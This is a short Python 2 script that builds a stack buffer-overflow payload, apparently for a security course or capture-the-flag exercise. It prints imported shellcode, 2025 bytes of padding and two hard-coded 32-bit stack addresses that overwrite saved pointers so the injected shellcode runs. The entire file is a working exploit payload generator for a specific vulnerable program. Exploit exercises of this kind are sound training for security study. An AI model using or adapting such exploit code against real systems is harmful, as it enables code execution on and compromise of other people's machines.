from struct import pack
from shellcode import shellcode

print shellcode+"a"*2025+pack("<I",0xbffe99d8)+pack("<I",0xbffea1ec)
